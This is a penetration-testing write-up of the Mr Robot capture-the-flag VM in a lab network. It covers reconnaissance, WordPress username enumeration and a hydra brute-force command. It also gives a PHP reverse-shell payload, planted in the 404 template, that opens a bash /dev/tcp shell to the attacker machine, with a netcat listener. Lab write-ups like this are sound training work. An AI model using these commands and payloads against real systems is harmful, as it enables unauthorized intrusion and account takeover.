# Mr Robot Penetration testing report

# Overview
A penetration testing report on MR ROBOT VM CFT, demonstrating credential attack, web exploitation (WordPress), reverse shell and privilege escalation technique.

## Lab environment
Attacker machine (Kali Linux) ip - 192.168.1.5
Target machine (Mr Robot VM)  ip - 192.168.1.8
Both the machine were configured to same NAT Network.

## Reconnaissance
### Host discovery 
Used arp-scan to find the ip address of the target machine. 
Command used "sudo arp-scan -l"
### Service and OS detection
Used command ```namp -sV -O 192.168.1.8``` to find the running services and underlying operating system.
### Bruteforcing Directories
Used command ```sudo dirb http://192.168.1.8``` to find the hidden files and directories within the web server. 

## Web Enumeration
After the dirb scan I found a file named ```http://192.168.1.8/robots.txt``` and then I manually inspected the file.
### Key findings 
"fsocity.dic" A massive wordlist.
"key-1-of-3.txt" The first flag. 

### Wordpress login page discovery
dirb scan also flagged a wp login page ```http://192.168.1.8/wp-login```. That got me into a target login page and also wordlist fsocity.dic to use against it. 

## User Enumeration: Cracking the login id
Used burpsuit intruder tool to determine the user name from the wordlist 'fsocity.dic'
### Key findings
Invalid Users: Triggered an error invalid user and password.
Valid User ("Elliot"): Triggered a specific message: "The password you entered for the username Elliot is incorrect."

## Password Attack
In order to get the password for the user "Elliot" I used hydra to bruteforce attack
### Wordlist optimization and cleanup
To make the attack faster and more efficient I used command ```sort /home/kali/mrrobot/fsocity.dic | uniq > ufsocity.txt``` 
### The Attack (hydra)
Used command ``` sudo hydra -vv -l Elliot -P  ufsocity.txt 192.168.1.8 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is Incorrect' ``` to crack the password successfully.

## Reverse Shell
After successfully logged into the website then I navigated to Appearance > Editor and selected the 404 Template since its easy to trigger. 
### Payload used 
    ```<?php
      exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/443 0>&1'");
    ?>```
### Netcat listener
 ```nc -lvp 443 ```
